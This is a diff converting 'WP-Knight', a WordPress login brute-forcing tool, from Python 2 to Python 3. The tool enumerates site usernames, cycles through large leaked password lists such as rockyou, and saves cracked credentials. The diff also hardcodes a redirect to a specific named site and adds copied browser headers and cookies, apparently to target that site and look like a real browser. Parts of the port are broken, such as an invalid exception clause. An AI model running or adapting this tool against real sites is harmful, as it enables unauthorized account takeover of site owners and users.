@@ -18,7 +18,7 @@ import sys
 import requests
 from tqdm import tqdm
 
-print """
+print ("""
 	                   _.--.    .--._
 	                 ."  ."      ".  ".
 	                ;  ."    /\    ".  ;
@@ -46,7 +46,7 @@ print """
 	                                     (_____|           
 	Coded by LogicPy - (WordPress Cracker) - [2.0.2 - 4.9.8]
 
-"""
+""")
 
 # Detecting incorrect password
 keyword = "incorrect"
@@ -64,26 +64,26 @@ listSel = 0
 
 def console():
 	while(True):
-		cmd = raw_input(" Command > ")
+		cmd = input(" Command > ")
 		if cmd == "help" or cmd == "?":
-			print """\n [i] Commands:\n
+			print ("""\n [i] Commands:\n
 	url - Specify target URL ( http://website.com/wp-login.php )
 	version - Check WordPress version ( Specify target URL first )
 	enumerate - Gather Usernames
 	list - Use Default List
 	go - Activate WP-Knight
 	exit - Exit WP-Knight
-			"""
+			""")
 		elif cmd == "exit":
 			sys.exit()
 		elif cmd == "go":
 			if login_URL == None:
-				print "\n Please specify URL \n"
+				print ("\n Please specify URL \n")
 			else:		
-				print "\n [+] WP-Knight Activated! \n"
+				print ("\n [+] WP-Knight Activated! \n")
 				bruteforce()
 		elif cmd == "enumerate":
-			wpGet = raw_input("\n Enter URL ( http://website.com/ ) > ")
+			wpGet = input("\n Enter URL ( http://website.com/ ) > ")
 			enumerate(wpGet)
 		elif cmd == "list":
 			list_config()
@@ -91,11 +91,11 @@ def console():
 			url_config()
 		elif cmd == "version":
 			if login_URL == None:
-				print "\n Please specify URL \n"
+				print ("\n Please specify URL \n")
 			else:
 				versionCheck()
 		else:
-			print "\n [!] Invalid Command \n"
+			print ("\n [!] Invalid Command \n")
 
 def find_between( s, first, last ):
     try:
@@ -108,7 +108,7 @@ def find_between( s, first, last ):
 def list_config():
 	global listSel
 
-	print """\n [i] Select List:\n
+	print ("""\n [i] Select List:\n
 	1) best110 (110 passwords)
 	2) 500 worst passwords (500 passwords)
 	3) best 1050 (1050 passwords)
@@ -119,45 +119,45 @@ def list_config():
 	8) battle 2 (31976 passwords)
 	9) battle 3 (100000 passwords)
 	10) battle 4 (1000000 passwords)
-	"""
-	listSel = raw_input(" Select List > ")
+	""")
+	listSel = input(" Select List > ")
 
 	if listSel == '1':
-		print "\n [i] best110 Selected! \n"
+		print ("\n [i] best110 Selected! \n")
 	elif listSel == '2':
-		print "\n [i] 500 worst passwords Selected! \n"
+		print ("\n [i] 500 worst passwords Selected! \n")
 	elif listSel == '3':
-		print "\n [i] best 1050 Selected! \n"
+		print ("\n [i] best 1050 Selected! \n")
 	elif listSel == '4':
-		print "\n [i] rockyou-10 Selected! \n"
+		print ("\n [i] rockyou-10 Selected! \n")
 	elif listSel == '5':
-		print "\n [i] rockyou-15 Selected! \n"
+		print( "\n [i] rockyou-15 Selected! \n")
 	elif listSel == '6':
-		print "\n [i] twitter-banned Selected! \n"
+		print( "\n [i] twitter-banned Selected! \n")
 	elif listSel == '7':
-		print "\n [i] battle Selected! \n"
+		print ("\n [i] battle Selected! \n")
 	elif listSel == '8':
-		print "\n [i] battle 2 Selected! \n"
+		print ("\n [i] battle 2 Selected! \n")
 	elif listSel == '9':
-		print "\n [i] battle 3 Selected! \n"
+		print ("\n [i] battle 3 Selected! \n")
 	elif listSel == '10':
-		print "\n [i] battle 4 Selected! \n"
+		print ("\n [i] battle 4 Selected! \n")
 	else:
-		print "\n [!] Invalid Selection \n"
+		print ("\n [!] Invalid Selection \n")
 
 def url_config():
 	global login_URL
 	global host
 
-	login_URL = raw_input("\n Enter target URL > ")
-	print "\n [i] Target: %s\n" % (login_URL)
+	login_URL = input("\n Enter target URL > ")
+	print( "\n [i] Target: %s\n" % (login_URL))
 
 def versionCheck():
 	global login_URL
 	headers = {'Accept-Encoding': 'identity'}
 	r = requests.get(login_URL, headers='')
 	a = find_between(r.text,"ver=","'")
-	print "\n [+] WordPress version: %s\n" % (a)
+	print ("\n [+] WordPress version: %s\n" % (a))
 
 def grab_json(base_url):
     try:
@@ -176,23 +176,23 @@ def grab_json(base_url):
 def extract_users(the_json):
     try:
         var_json = json.loads(the_json)
-    except Exception, e:
-        print "\n [!] JSON Error \n"
+    except (Exception, e):
+        print ("\n [!] JSON Error \n")
     try:
-        print "\n [+] Found %d users" %(len(var_json))
+        print ("\n [+] Found %d users" %(len(var_json)))
         for x in range(0, len(var_json)):
             user_id = var_json[x]['id']
             full_name = var_json[x]['name']
             user_name = var_json[x]['slug']
-            print " [>] User ID: %s, Name: %s, Username: %s" %(user_id, full_name, user_name)
+            print (" [>] User ID: %s, Name: %s, Username: %s" %(user_id, full_name, user_name))
     except Exception:
-        print "\n [!] Username enumeration failed \n"
+        print ("\n [!] Username enumeration failed \n")
 
 def enumerate(wpURL):
     json = grab_json(base_url=wpURL)
     if json != False:
         extract_users(the_json=json)
-    print ""
+    print ("")
 
 # Automatic save upon cracked
 def crack_save(uname,pwd):
@@ -201,7 +201,7 @@ def crack_save(uname,pwd):
 		file.write("Previous Cracked Password (%s:%s)" % (uname, pwd))
 		file.close()
 	except:
-		print "\n [!] Save Error \n"
+		print ("\n [!] Save Error \n")
 
 # Automatic save during attack
 def cycle_save(uname,pwd):
@@ -210,7 +210,7 @@ def cycle_save(uname,pwd):
 		file.write("Your Last Cycle Position (%s:%s)" % (uname, pwd))
 		file.close()
 	except:
-		print "\n [!] Save Error \n"
+		print ("\n [!] Save Error \n")
 
 def bruteforce():
 	global aPlace
@@ -262,7 +262,7 @@ def bruteforce():
 		# Configure progress bar with total value
 		progressBar = tqdm(total=totalCalc)
 
-		print '\n\n [?] Username: %s \n\n' % (USERNAME)
+		print( '\n\n [?] Username: %s \n\n' % (USERNAME))
 
 		# Username cycle
 		for u in USERNAME:
@@ -286,12 +286,15 @@ def bruteforce():
 						'log': uname,
 						'pwd': pwd,
 						'wp-submit': 'Log In',
+                        'redirect_to': 'https://pi-labs.ai/wp-admin/',
 						'testcookie': '1'
 					}
 
 					#Header data
 					header_data = {
-						'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0'
+                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                        'cookie': '_ga=GA1.1.820410267.1725488604; wordpress_test_cookie=WP%20Cookie%20check; _ga_4LPRJKWN4X=GS1.1.1725488604.1.1.1725489645.0.0.0',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
 					}
 
 					# 2) Submit POST data. Initialize login
@@ -300,15 +303,15 @@ def bruteforce():
 					cookie = str(r.cookies)
 
 					if debug_Mode == True:
-						print "\n %s \n" % (cookie)
+						print ("\n %s \n" % (cookie))
 
 					if cookie.find('settings')>-1 or cookie.find('=' + uname)>-1:
 						progressBar.close()
-						print "\n Cracked [ %s : %s ] \n" % (u,p)
+						print ("\n Cracked [ %s : %s ] \n" % (u,p))
 						crack_save(u,p)
 						break
 				except:
-					print "\n [!] Connection Error \n"
+					print ("\n [!] Connection Error \n")
 
 				# Save your position every 500 cycles
 				if saveInt % 500 == 0:
